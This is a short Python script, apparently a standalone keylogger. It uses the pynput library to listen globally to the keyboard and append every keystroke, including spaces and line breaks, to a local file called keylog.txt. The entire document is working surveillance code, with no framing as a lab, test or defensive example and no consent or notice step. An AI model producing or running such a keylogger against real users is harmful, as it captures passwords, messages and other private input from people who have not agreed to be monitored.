from pynput import  keyboard

def keyPressed(key):
    print(str(key))
    with open("keylog.txt", "a") as logKey:
        try:
            logKey.write(key.char)
        except AttributeError:
            if key == key.space:
                logKey.write(" ")
            elif key == key.enter:
                logKey.write("\n")
            else:
                logKey.write(str(key))

if __name__ == "__main__":
    listener= keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

